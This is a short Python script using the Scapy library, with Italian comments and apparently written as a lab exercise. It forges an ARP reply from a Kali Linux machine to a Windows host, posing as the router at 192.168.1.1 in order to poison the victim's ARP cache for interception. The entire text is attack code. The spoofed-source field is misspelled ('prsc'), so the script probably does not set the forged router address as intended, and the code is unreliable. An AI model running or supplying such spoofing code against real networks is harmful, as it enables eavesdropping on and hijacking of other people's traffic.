# air spoofing

from scapy.all import *

risposta_arp = ARP()
print(risposta_arp.show())

# modifico dei dati
# queste informazioni le invieremo da Kali Linux fingendo di essere il Router
# il campo psrc funge di essere l'IP del router invece di Kali
risposta_arp.op = 2
risposta_arp.pdst = "192.168.1.163" # IP di windows
risposta_arp.hwdst = "00:90:8b:1f:53:11" # MAC di Windows
risposta_arp.hwsrc = "00:90:8b:11:45:6f" # MAC di Kali
risposta_arp.prsc = "192.168.1.1" # valore falso

# inviamo il pacchetto
send(risposta_arp)

print(risposta_arp.show())
